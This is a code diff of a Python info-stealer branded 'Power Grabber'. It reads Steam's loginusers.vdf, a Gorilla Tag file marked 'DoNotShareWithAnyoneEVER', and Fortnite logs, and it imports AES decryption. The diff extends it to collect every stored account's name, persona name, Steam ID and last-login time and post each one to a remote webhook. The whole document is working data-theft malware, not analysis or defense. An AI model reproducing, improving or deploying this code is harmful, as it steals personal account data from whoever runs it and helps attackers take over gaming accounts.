@@ -3,6 +3,8 @@ import re
 import requests
 import datetime
 import json
+from Crypto.Cipher import AES
+from base64 import b64decode
 file_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'LocalLow', 'Another Axiom', 'Gorilla Tag', 'DoNotShareWithAnyoneEVERNoMatterWhatTheySay.txt')
 app_data_path = os.getenv('APPDATA')
 log_file_path = os.path.join(app_data_path, r"..\Local\FortniteGame\Saved\Logs\FortniteGame.log")
@@ -80,91 +82,69 @@ STEAM_DEFAULT_PATHS = [
     "C:\\Program Files\\Steam",
     os.path.expanduser("~\\AppData\\Local\\Steam")
 ]
-SYSTEM_GAME_NAMES = {
-    "Steamworks Common Redistributables",
-    "SteamVR",
-    "Steam Client",
-    "Source SDK",
-    "Steam Runtime"
-}
 def is_steam_installed():
     for path in STEAM_DEFAULT_PATHS:
         steam_exe_path = os.path.join(path, "steam.exe")
         if os.path.exists(steam_exe_path):
             return path
     return None
+def convert_timestamp_to_human_readable(timestamp):
+    dt = datetime.datetime.utcfromtimestamp(timestamp)
+    return dt.strftime("%B | %d | %Y %I:%M:%S %p")
 def get_account_name_and_steam_id_from_vdf(vdf_path):
-    global account_name
+    accounts = []
     try:
         with open(vdf_path, "r", encoding="utf-8") as file:
             data = file.read()
-            account_name_match = re.search(r'"AccountName"\s+"(.*?)"', data)
-            steam_id_match = re.search(r'"(\d{17})"', data)
-            account_name = account_name_match.group(1) if account_name_match else None
-            steam_id = steam_id_match.group(1) if steam_id_match else None
-            return account_name, steam_id
+            users_section = re.findall(r'"(\d{17})"\s*{(.*?)}', data, re.DOTALL)
+            for steam_id, user_data in users_section:
+                account_name_match = re.search(r'"AccountName"\s+"(.*?)"', user_data)
+                persona_name_match = re.search(r'"PersonaName"\s+"(.*?)"', user_data)
+                timestamp_match = re.search(r'"Timestamp"\s+"(\d+)"', user_data)
+                account_name = account_name_match.group(1) if account_name_match else "N/A"
+                persona_name = persona_name_match.group(1) if persona_name_match else "N/A"
+                timestamp = int(timestamp_match.group(1)) if timestamp_match else None
+                if timestamp:
+                    timestamp = convert_timestamp_to_human_readable(timestamp)
+                accounts.append((steam_id, account_name, persona_name, timestamp))
+        return accounts
     except FileNotFoundError:
         pass
+        return None
     except PermissionError:
         pass
-    return None, None
-def get_library_folders(steam_install_path):
-    libraryfolders_path = os.path.join(steam_install_path, "steamapps", "libraryfolders.vdf")
-    library_folders = [steam_install_path]
-    if os.path.exists(libraryfolders_path):
-        with open(libraryfolders_path, "r", encoding="utf-8") as file:
-            data = file.read()
-            additional_folders = re.findall(r'"path"\s+"(.*?)"', data)
-            library_folders.extend(additional_folders)
-    return library_folders
-def parse_acf_file(file_path):
-    with open(file_path, "r", encoding="utf-8") as file:
-        for line in file:
-            if '"name"' in line:
-                return line.split('"')[3]
-    return None
-def get_installed_steam_games(steam_install_path):
-    installed_games = []
-    library_folders = get_library_folders(steam_install_path)
-    for library in library_folders:
-        steamapps_path = os.path.join(library, "steamapps")
-        if os.path.exists(steamapps_path):
-            for item in os.listdir(steamapps_path):
-                if item.endswith(".acf"):
-                    acf_path = os.path.join(steamapps_path, item)
-                    game_name = parse_acf_file(acf_path)
-                    if game_name and game_name not in SYSTEM_GAME_NAMES:
-                        installed_games.append(game_name)
-    return installed_games
-def send_webhook(account_name, games, steam_id, image_url):
+        return None
+def send_webhook(account_name, persona_name, steam_id, timestamp, image_url):
     games_url = f"https://steamcommunity.com/id/{steam_id}/games"
     wishlist_url = f"https://steamcommunity.com/id/{steam_id}/wishlist"
-    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
     embed = {
         "embeds": [
             {
                 "title": f"🎮 Steam Account Info for **{account_name}**",
-                "description": (
-                    "Here is some steam info for this user."
-                ),
+                "description": "Here is some steam info for this user.",
                 "color": 0x8b0000,
                 "thumbnail": {
                     "url": image_url
                 },
                 "fields": [
                     {
-                        "name": "👤 **Steam Account Name**",
+                        "name": "👤 **Account Name:**",
                         "value": f"**{account_name}**",
                         "inline": True
                     },
                     {
-                        "name": "🎮 **Number of Games**",
-                        "value": f"{len(games)} games installed",
-                        "inline": True
+                        "name": "**Persona Name:**",
+                        "value": f"{persona_name}",
+                        "inline": False
                     },
                     {
-                        "name": "🕹️ **Installed Games**",
-                        "value": "\n".join(games) if games else "No games installed.",
+                        "name": "🪪 **Steam ID**",
+                        "value": f"{steam_id}",
+                        "inline": False
+                    },
+                    {
+                        "name": "👤 **User's Profile:**",
+                        "value": f"[Click Me](https://steamcommunity.com/profiles/{steam_id})",
                         "inline": False
                     },
                     {
@@ -176,13 +156,18 @@ def send_webhook(account_name, games, steam_id, image_url):
                         "name": "🌠 **User's Wishlist:**",
                         "value": f"[Click Me]({wishlist_url})",
                         "inline": False
+                    },
+                    {
+                        "name": "🕝 **Last Login:**",
+                        "value": f"{timestamp}",
+                        "inline": False
                     }
                 ],
                 "footer": {
                     "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
                     "icon_url": image_url
                 },
-                "timestamp": timestamp
+                "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
             }
         ]
     }
@@ -199,10 +184,13 @@ def main():
     if steam_install_path:
         config_path = os.path.join(steam_install_path, "config")
         vdf_path = os.path.join(config_path, "loginusers.vdf")
-        account_name, steam_id = get_account_name_and_steam_id_from_vdf(vdf_path)
-        if account_name and steam_id:
-            games = get_installed_steam_games(steam_install_path)
-            send_webhook(account_name, games, steam_id, image_url)
+        accounts = get_account_name_and_steam_id_from_vdf(vdf_path)
+        if accounts:
+            sent_accounts = set()
+            for steam_id, account_name, persona_name, timestamp in accounts:
+                if steam_id not in sent_accounts:
+                    send_webhook(account_name, persona_name, steam_id, timestamp, image_url)
+                    sent_accounts.add(steam_id)
         else:
             pass
     else:
